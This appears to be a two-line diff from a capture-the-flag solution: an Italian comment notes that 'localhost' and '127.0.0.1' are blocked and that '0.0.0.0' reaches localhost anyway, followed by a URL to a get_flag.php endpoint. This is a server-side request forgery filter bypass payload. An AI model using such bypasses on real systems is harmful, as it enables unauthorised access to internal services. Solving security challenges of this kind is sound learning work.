@@ -1,0 +1,2 @@
+# Siccome blocca 'localhost' e '127.0.0.1', un altro modo per riferirsi a localhost è '0.0.0.0'.
+http://0.0.0.0/get_flag.php
